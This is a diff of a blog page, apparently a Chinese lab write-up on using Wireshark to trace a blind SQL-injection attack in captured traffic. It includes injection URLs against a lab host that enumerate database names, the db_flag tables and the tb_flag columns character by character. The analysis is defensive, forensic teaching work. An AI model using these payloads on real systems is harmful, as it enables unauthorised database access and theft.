@@ -185,15 +185,13 @@
               <h3 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h3><p>利用wireshark分析sql注入攻击,要求通过分析协议包文件,实现攻击者IP溯源和攻击证据链提供。</p>
 <h5 id="资源下载："><a href="#资源下载：" class="headerlink" title="资源下载："></a>资源下载：</h5><p><a href="https://pan.baidu.com/s/1FJZ5TDjA5zx8sBr-_wONOQ" target="_blank" rel="noopener">百度云</a><br>提取码：tccz</p>
 <h3 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h3><ol>
-<li><p><strong>观察报文规律</strong></p>
-<p>猜测得到当sql注入成功时，返回的报文中会有</p>
+<li><h4 id="观察报文规律"><a href="#观察报文规律" class="headerlink" title="观察报文规律"></a><strong>观察报文规律</strong></h4><p>猜测得到当sql注入成功时，返回的报文中会有</p>
 <pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"span7 text-center"</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>This's Title!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">'lead'</span>&gt;</span>Content is very short!<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></code></pre>
 
 <p>该字段是sql注入成功的反馈</p>
 </li>
-<li><p>过滤数据包**</p>
-<p>为使分析比较方便，只分析服务器返回的报文，其中有url攻击信息，也有结果显示。</p>
+<li><h4 id="过滤数据包"><a href="#过滤数据包" class="headerlink" title="过滤数据包"></a>过滤数据包</h4><p>为使分析比较方便，只分析服务器返回的报文，其中有url攻击信息，也有结果显示。</p>
 <p>过滤数据包</p>
 <pre><code class="hljs applescript">frame <span class="hljs-keyword">contains</span> <span class="hljs-string">"This's Title"</span></code></pre>
 
@@ -245,8 +243,7 @@
 <p>返回的结果没有<strong>title</strong></p>
 <p>所以注入失败，说明该数据库名字长度为<strong>7</strong>。</p>
 </li>
-<li><p><strong>爆破数据库名</strong></p>
-<p>如</p>
+<li><h4 id="爆破数据库名"><a href="#爆破数据库名" class="headerlink" title="爆破数据库名"></a><strong>爆破数据库名</strong></h4><p>如</p>
 <pre><code class="hljs http">http://172.16.80.11/index.php?act=news&amp;id=1%20and%20ascii(substr(((select%20SCHEMA_name%20from%20information_schema.SCHEMATA%20limit%202,1)),%201,%201))&gt;75</code></pre>
 
 <p>一直到</p>
@@ -279,8 +276,7 @@
 <p>116,101,115,116</p>
 <p>test</p>
 </li>
-<li><p><strong>爆破db_flag数据库</strong></p>
-<p>由于该文件后面流量只有爆破db_flag的信息，所以其他数据库可以不用管</p>
+<li><h4 id="爆破db-flag数据库"><a href="#爆破db-flag数据库" class="headerlink" title="爆破db_flag数据库"></a><strong>爆破db_flag数据库</strong></h4><p>由于该文件后面流量只有爆破db_flag的信息，所以其他数据库可以不用管</p>
 <p>很容易找到接下的报文信息：</p>
 <pre><code class="hljs http">http://172.16.80.11/index.php?act=news&amp;id=1%20and%20length((select%20count(*)%20from%20information_schema.tables%20where%20TABLE_SCHEMA='db_flag'))&gt;0</code></pre>
 
@@ -308,8 +304,7 @@
 <p>第七个字符：Ascii码103，为g</p>
 <p>表名为tb_flag</p>
 </li>
-<li><p><strong>爆破字段</strong></p>
-<pre><code class="hljs perl">http:<span class="hljs-regexp">//</span><span class="hljs-number">172.16</span>.<span class="hljs-number">80.11</span>/index.php?act=news&amp;id=<span class="hljs-number">1</span>%20and%20length((<span class="hljs-keyword">select</span>%20count(*)%20from%20information_schema.COLUMNS%20where%20TABLE_SCHEMA=<span class="hljs-string">'db_flag'</span>%20and%20TABLE_NAME=<span class="hljs-string">'tb_flag'</span>))&gt;<span class="hljs-number">0</span></code></pre>
+<li><h4 id="爆破字段"><a href="#爆破字段" class="headerlink" title="爆破字段"></a><strong>爆破字段</strong></h4><pre><code class="hljs perl">http:<span class="hljs-regexp">//</span><span class="hljs-number">172.16</span>.<span class="hljs-number">80.11</span>/index.php?act=news&amp;id=<span class="hljs-number">1</span>%20and%20length((<span class="hljs-keyword">select</span>%20count(*)%20from%20information_schema.COLUMNS%20where%20TABLE_SCHEMA=<span class="hljs-string">'db_flag'</span>%20and%20TABLE_NAME=<span class="hljs-string">'tb_flag'</span>))&gt;<span class="hljs-number">0</span></code></pre>
 
 <pre><code class="hljs perl">http:<span class="hljs-regexp">//</span><span class="hljs-number">172.16</span>.<span class="hljs-number">80.11</span>/index.php?act=news&amp;id=<span class="hljs-number">1</span>%20and%20ascii(<span class="hljs-keyword">substr</span>(((<span class="hljs-keyword">select</span>%20count(*)%20from%20information_schema.COLUMNS%20where%20TABLE_SCHEMA=<span class="hljs-string">'db_flag'</span>%20and%20TABLE_NAME=<span class="hljs-string">'tb_flag'</span>)),%201,%201))&gt;<span class="hljs-number">49</span></code></pre>
 
